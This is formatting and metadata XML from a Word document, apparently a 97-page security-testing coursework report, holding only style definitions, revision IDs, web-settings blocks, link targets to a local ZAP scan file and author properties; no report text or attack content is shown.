    <w:rsid w:val="00E76FB5"/>
    <w:rsid w:val="00E806CB"/>
    <w:rsid w:val="00E852C2"/>
    <w:rsid w:val="00E935C0"/>
    <w:rsid w:val="00E9641C"/>
    <w:rsid w:val="00EA104E"/>
    <w:rsid w:val="00EA2E30"/>
    <w:rsid w:val="00EA6881"/>
    <w:rsid w:val="00EB5A9E"/>
    <w:rsid w:val="00EB5E5C"/>
    <w:rsid w:val="00EB687A"/>
    <w:rsid w:val="00EB748F"/>
    <w:rsid w:val="00EC01BA"/>
    <w:rsid w:val="00EC09DC"/>
    <w:rsid w:val="00EC27F5"/>
    <w:rsid w:val="00EC4BB8"/>
    <w:rsid w:val="00EC6689"/>
    <w:rsid w:val="00ED3417"/>
    <w:rsid w:val="00ED3CCF"/>
    <w:rsid w:val="00ED6BB4"/>
    <w:rsid w:val="00ED74EC"/>
    <w:rsid w:val="00EE04F4"/>
    <w:rsid w:val="00EE1635"/>
    <w:rsid w:val="00EE193D"/>
    <w:rsid w:val="00EE6186"/>
    <w:rsid w:val="00EF0C8C"/>
    <w:rsid w:val="00EF24F1"/>
    <w:rsid w:val="00EF2CDB"/>
    <w:rsid w:val="00EF5198"/>
    <w:rsid w:val="00EF561D"/>
    <w:rsid w:val="00EF765E"/>
    <w:rsid w:val="00F00345"/>
    <w:rsid w:val="00F004B6"/>
    <w:rsid w:val="00F05E7D"/>
    <w:rsid w:val="00F06A63"/>
    <w:rsid w:val="00F10A54"/>
    <w:rsid w:val="00F12879"/>
    <w:rsid w:val="00F12A52"/>
    <w:rsid w:val="00F1643D"/>
    <w:rsid w:val="00F22F62"/>
    <w:rsid w:val="00F23E6A"/>
    <w:rsid w:val="00F32400"/>
    <w:rsid w:val="00F33EAA"/>
    <w:rsid w:val="00F40A2C"/>
    <w:rsid w:val="00F45CE3"/>
    <w:rsid w:val="00F50E1E"/>
    <w:rsid w:val="00F63B8B"/>
    <w:rsid w:val="00F662A3"/>
    <w:rsid w:val="00F665CB"/>
    <w:rsid w:val="00F70916"/>
    <w:rsid w:val="00F738A7"/>
    <w:rsid w:val="00F81E00"/>
    <w:rsid w:val="00F832BA"/>
    <w:rsid w:val="00F84712"/>
    <w:rsid w:val="00F875B9"/>
    <w:rsid w:val="00F97B5F"/>
    <w:rsid w:val="00FA4300"/>
    <w:rsid w:val="00FA4E40"/>
    <w:rsid w:val="00FA549C"/>
    <w:rsid w:val="00FA66E8"/>
    <w:rsid w:val="00FB2E5B"/>
    <w:rsid w:val="00FB4A8F"/>
    <w:rsid w:val="00FB7508"/>
    <w:rsid w:val="00FC0F9B"/>
    <w:rsid w:val="00FC1532"/>
    <w:rsid w:val="00FD2DA4"/>
    <w:rsid w:val="00FD6009"/>
    <w:rsid w:val="00FF51EB"/>
    <w:rsid w:val="00FF69A5"/>
    <w:rsid w:val="00FF76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C8566"/>
  <w15:docId w15:val="{9A75A6C3-13A7-4DB5-BD8B-073770D3A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417"/>
    <w:pPr>
      <w:jc w:val="both"/>
    </w:pPr>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6F552D"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:numPr>
        <w:ilvl w:val="1"/>
        <w:numId w:val="12"/>
      </w:numPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="12" w:space="1" w:color="auto"/>
      </w:pBdr>
      <w:spacing w:before="600" w:after="440"/>
      <w:ind w:left="578" w:hanging="578"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:caps/>
      <w:color w:val="274221" w:themeColor="accent4" w:themeShade="80"/>
      <w:sz w:val="30"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading3Char"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00337ED3"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:numPr>
        <w:ilvl w:val="2"/>
        <w:numId w:val="12"/>
      </w:numPr>
      <w:spacing w:before="200" w:after="120"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="0D2B3E" w:themeColor="accent3" w:themeShade="80"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading4">
    <w:name w:val="heading 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading4Char"/>
    <w:uiPriority w:val="9"/>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6F552D"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Calibri" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:caps/>
      <w:color w:val="274221" w:themeColor="accent4" w:themeShade="80"/>
      <w:sz w:val="30"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading3"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00337ED3"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="0D2B3E" w:themeColor="accent3" w:themeShade="80"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading4Char">
    <w:name w:val="Heading 4 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading4"/>
    <w:uiPriority w:val="9"/>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C3556C"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:sz w:val="18"/>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C3556C"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:sz w:val="18"/>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character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00F06A63"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="GridTable2-Accent4">
    <w:name w:val="Grid Table 2 Accent 4"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="47"/>
    <w:rsid w:val="00337ED3"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>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4-Accent4">
    <w:name w:val="Grid Table 4 Accent 4"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="49"/>
    <w:rsid w:val="00337ED3"/>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paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00C35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3556C"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00DA102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numbering" w:customStyle="1" w:styleId="NoList1">
    <w:name w:val="No List1"/>
    <w:next w:val="NoList"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00DA102C"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="msonormal0">
    <w:name w:val="msonormal"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00DA102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201E44"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentText">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="CommentTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00201E44"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentTextChar">
    <w:name w:val="Comment Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="CommentText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00201E44"/>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201E44"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentSubjectChar">
    <w:name w:val="Comment Subject Char"/>
    <w:basedOn w:val="CommentTextChar"/>
    <w:link w:val="CommentSubject"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00201E44"/>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34945">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>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359013734">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="384373202">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427501352">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828517191">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="905262329">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="997420424">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="8" w:color="337AB7"/>
            <w:left w:val="none" w:sz="0" w:space="11" w:color="337AB7"/>
            <w:bottom w:val="single" w:sz="6" w:space="8" w:color="337AB7"/>
            <w:right w:val="none" w:sz="0" w:space="11" w:color="337AB7"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>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84498981">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471480143">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1516772097">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="676352395">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="8" w:color="337AB7"/>
            <w:left w:val="none" w:sz="0" w:space="11" w:color="337AB7"/>
            <w:bottom w:val="single" w:sz="6" w:space="8" w:color="337AB7"/>
            <w:right w:val="none" w:sz="0" w:space="11" w:color="337AB7"/>
          </w:divBdr>
        </w:div>
      </w:divsChild>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683042879">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1886721407">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1983610406">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="204297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file:///C:\Users\Aidan\Desktop\CMP%20319\Evidence\Zap\Vuln%20Scan.html" TargetMode="Externa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file:///C:\Users\Aidan\Desktop\CMP%20319\Evidence\Zap\Vuln%20Scan.html"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file:///C:\Users\Aidan\Desktop\CMP%20319\Evidence\Zap\Vuln%20Scan.html"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Aidan\Desktop\CMP%20319\Evidence\Zap\Vuln%20Scan.html" TargetMode="External"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image42.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hyperlink" Target="mailto:hacklab@hacklab.com:hacklab:1606137139"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FE95DE46-F529-48A4-BD7A-B1B1548B5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223</TotalTime>
  <Pages>97</Pages>
  <Words>22326</Words>
  <Characters>127259</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149287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Colin M</dc:creator>
  <cp:lastModifiedBy>Aidan Cram</cp:lastModifiedBy>
  <cp:revision>10</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2021-01-11T12:26:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2021-01-11T17:34:00Z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